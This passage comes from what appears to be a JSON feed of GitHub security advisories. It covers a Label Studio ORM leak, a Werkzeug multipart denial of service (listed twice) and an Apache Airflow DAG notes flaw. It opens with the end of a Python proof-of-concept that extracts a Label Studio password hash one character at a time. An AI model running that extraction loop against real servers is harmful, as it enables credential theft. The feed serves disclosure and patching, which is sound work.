f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47117\">https://nvd.nist.gov/vuln/detail/CVE-2023-47117</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/f931d9d129002f54a495995774ce7384174cef5c\">https://github.com/HumanSignal/label-studio/commit/f931d9d129002f54a495995774ce7384174cef5c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hjj-gq77-j4qw\">https://github.com/advisories/GHSA-6hjj-gq77-j4qw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hjj-gq77-j4qw",
            "title": "[label-studio] Label Studio Object Relational Mapper Leak Vulnerability in Filtering Task",
            "date_modified": "2023-11-14T18:27:12.000Z",
            "date_published": "2023-11-14T18:27:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hjj-gq77-j4qw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.</p>\n<p>This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw\">https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw</a></li>\n<li><a href=\"https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1\">https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46136\">https://nvd.nist.gov/vuln/detail/CVE-2023-46136</a></li>\n<li><a href=\"https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2\">https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml</a></li>\n<li><a href=\"https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9\">https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hrfv-mqp8-q5rw\">https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hrfv-mqp8-q5rw",
            "title": "[werkzeug] Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning",
            "date_modified": "2023-11-13T21:05:55.000Z",
            "date_published": "2023-10-25T14:22:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hrfv-mqp8-q5rw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.</p>\n<p>This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw\">https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw</a></li>\n<li><a href=\"https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1\">https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46136\">https://nvd.nist.gov/vuln/detail/CVE-2023-46136</a></li>\n<li><a href=\"https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2\">https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml</a></li>\n<li><a href=\"https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9\">https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hrfv-mqp8-q5rw\">https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hrfv-mqp8-q5rw",
            "title": "[werkzeug] Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning",
            "date_modified": "2023-11-13T21:05:55.000Z",
            "date_published": "2023-10-25T14:22:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hrfv-mqp8-q5rw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Airflow, versions before 2.7.3, is affected by a vulnerability that allows authenticated and DAG-view authorized Users to modify some DAG run detail values when submitting notes. This could have them alter details such as configuration parameters, start date, etc.&nbsp; Users should upgrade to version 2.7.3 or later which has removed the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47037\">https://nvd.nist.gov/vuln/detail/CVE-2023-47037</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/33413\">https://github.com/apache/airflow/pull/33413</a></li>\n<li><a href=\"https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0\">https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/11/12/1\">http://www.openwall.com/lists/oss-security/2023/11/12/1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hm9r-7f84-25c9\">https://github.com/advisories/GHSA-hm9r-7f84-25c9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hm9r-7f84-25c9",
            "title": "[apache-airflow] Apache Airflow allows authenticated and DAG-view authorized users to modify some DAG run detail values when submitting notes",
            "date_modified": "2023-11-13T20:43:21.000Z",
            "date_published": "2023-11-12T15:30:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hm9r-7f84-25c9"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}